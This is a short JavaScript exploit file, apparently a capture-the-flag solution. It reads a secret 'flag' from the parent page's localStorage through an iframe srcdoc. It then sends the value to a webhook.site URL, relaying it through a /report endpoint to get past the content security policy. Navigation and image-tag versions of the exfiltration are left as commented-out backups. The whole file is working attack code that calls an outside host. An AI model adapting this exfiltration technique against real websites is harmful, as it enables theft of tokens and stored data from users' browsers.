// exploit.js
// We are inside an iframe srcdoc, which in Chrome shares 
// the parent's origin → we can read their localStorage!

(function() {
    // Step A: Steal the flag from localStorage
    var flag = window.parent.localStorage.getItem('flag');
    
    // Step B: Exfiltrate via the /report endpoint
    // /report is on 'self' → CSP allows this fetch!
    // The bot will then visit our webhook URL carrying the flag
    var exfilUrl = 'https://webhook.site/YOUR-UNIQUE-ID/?flag=' + encodeURIComponent(flag);
    
    // Method 1: Use /report as a relay (bot visits our URL)
    fetch('/report?url=' + encodeURIComponent(exfilUrl));
    
    // Method 2 (backup): navigate the parent window directly
    // window.parent.location.href = exfilUrl;
    
    // Method 3 (backup): create an img tag
    // var img = new Image();
    // img.src = exfilUrl;
    // document.body.appendChild(img);
})();
